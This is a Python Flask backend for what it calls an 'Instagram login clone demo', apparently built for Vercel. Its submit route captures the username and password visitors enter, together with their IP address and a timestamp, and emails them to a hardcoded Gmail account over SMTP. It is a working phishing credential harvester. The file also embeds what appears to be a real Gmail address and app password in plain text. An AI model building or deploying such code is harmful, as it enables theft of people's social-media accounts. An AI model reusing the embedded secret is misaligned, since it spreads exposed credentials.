from flask import Flask, request, render_template
from email.mime.text import MIMEText
import smtplib
from datetime import datetime, timezone
import logging
import socket

# Configure logging for Vercel logs
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__, template_folder='../../templates')  # Adjust path for Vercel static files

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    # Get form data with fallback values
    username = request.form.get('username', 'admin')
    password = request.form.get('password', 'ding2')
    
    # Get client IP
    ip_address = request.remote_addr if request.remote_addr != '127.0.0.1' else '::1'
    
    # Email configuration
    your_email = "tinanshi621@gmail.com"  # Your Gmail (update if needed)
    app_password = "xuvctrovavopuexv"     # Your 16-char App Password (no spaces, update if regenerated)
    
    # Use timezone-aware datetime for UTC
    timestamp = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    
    # Email content
    body = f"""Login Attempt Captured
Timestamp: {timestamp}
IP Address: {ip_address}
Username: {username}
Password: {password}

This is from your Instagram login clone demo."""
    msg = MIMEText(body)
    msg['Subject'] = "Login Attempt Captured"
    msg['From'] = your_email
    msg['To'] = your_email

    # Send email with timeout to avoid serverless hang (Vercel-compatible)
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)  # 10-second timeout
        server.starttls()
        server.login(your_email, app_password)
        server.sendmail(your_email, your_email, msg.as_string())
        server.quit()
        logger.info("Demo email sent successfully!")
    except (smtplib.SMTPException, socket.timeout, Exception) as e:
        logger.error(f"Email sending failed: {str(e)}")
        return "Demo submitted! (Email failed—check logs.)", 200

    return "Demo submitted successfully! Check your email.", 200

# Export the app for Vercel serverless
app = app
